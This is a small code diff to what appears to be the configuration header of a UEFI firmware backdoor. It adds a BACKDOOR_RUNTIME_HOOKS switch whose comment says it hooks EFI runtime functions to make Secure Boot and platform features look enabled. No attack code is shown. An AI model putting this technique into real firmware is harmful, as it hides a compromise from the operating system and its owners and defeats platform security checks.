@@ -20,6 +20,12 @@
 #define BACKDOOR_DEBUG_SPLASH
 
 /*
+    Hook EFI runtime functions in order to emulate enabled Secure Boot
+    and platform features.
+*/
+#define BACKDOOR_RUNTIME_HOOKS
+
+/*
     Write debug messages to the screen using UEFI simple
     text output protocol.
 */
